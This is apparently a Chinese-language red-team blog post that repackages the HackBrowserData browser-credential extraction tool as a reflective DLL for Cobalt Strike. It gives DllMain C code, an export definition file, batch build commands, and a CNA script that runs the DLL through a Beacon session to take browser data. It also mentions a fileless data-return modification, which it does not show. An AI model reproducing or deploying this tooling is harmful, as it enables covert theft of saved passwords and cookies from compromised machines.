# Go项目反射改造

## 简介

反射加载也没什么好说的，突然一时兴起想试一下能不能搞出来go的反射模块，发现已经有师傅铺好了路，这里手动@[WBGlIl](https://github.com/WBGlIl)师傅，选了用[HackBrowserData](https://github.com/moonD4rk/HackBrowserData)项目。

## 过程

首先修改一些默认选项，删除一些字符串，指定输出格式json，开启压缩存储。

![](../.gitbook/assets/image%20%28277%29.png)

复制一个main函数命名为run，导出它。

![&#x6CE8;&#x610F;&#x4E0A;&#x9762;&#x7684;&#x6CE8;&#x91CA;&#x662F;&#x53C2;&#x4E0E;&#x7F16;&#x8BD1;&#x7684;&#xFF0C;&#x58F0;&#x660E;&#x5BFC;&#x51FA;&#x3002;](../.gitbook/assets/image%20%28284%29.png)

添加如下文件。

```text
//dllmain.def

EXPORTS
    run
    ReflectiveLoader

//dllmain.c
#include "dllmain.h"
#include <Windows.h>
#include <stdio.h>
#define DLL_QUERY_HMODULE 6
extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
	BOOL bReturnValue = TRUE;
	switch( dwReason ) {
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			run();
			fflush(stdout);
			ExitProcess(0);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
			break;
	}
	return bReturnValue;
}

//dllmain.go
package main

//#include "dllmain.h"
//#include "ReflectiveLoader.h"
import "C"

//ReflectiveLoader.h
这玩意就省略了...
```

然后使用如下bat编译。

```text
//x64
del dllmain.a
set GOARCH=amd64
go build -a -v --gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH -ldflags "-w -s" -buildmode=c-archive -o dllmain.a
gcc dllmain.def dllmain.a -shared -lwinmm -lWs2_32 -o dllmain.dll
move dllmain.dll reflective_dll.x64.dll
//x32
set GOARCH=386
set CGO_ENABLED=0
set path=E:\mingw32\bin\;%path%
go build --ldflags "-s -w" -buildmode=c-archive -o dllmain.a
gcc dllmain.def dllmain.a -shared -lwinmm -lWs2_32 -o dllmain.dll
move dllmain.dll reflective_dll.dll 

```

然后改造下这个项目，让他不落地回传数据，这部分代码就不贴了。

![](../.gitbook/assets/image%20%28281%29.png)

## 效果

都先patch一下。

![](../.gitbook/assets/image%20%28282%29.png)

都能跑起来。

![](../.gitbook/assets/image%20%28278%29.png)

编写cna脚本。

```text
alias hackDataBrowers {
	local('$dll');
	btask($1, "Task Beacon to run HackDataBrowers", "T9999");
	if (-is64 $1) {
		$dll    = getFileProper(script_resource("resources"), "reflective_dll.x64.dll");
	}
	else {
		$dll    = getFileProper(script_resource("resources"), "reflective_dll.dll");
	}
	bdllspawn($1, $dll , $2, "Get Browers Data", 5000, false);

}
```

### 遗留问题

这玩意体积太大了，cs的反射函数直接罢工。。。。。

## LINKS

{% embed url="https://github.com/WBGlIl" %}



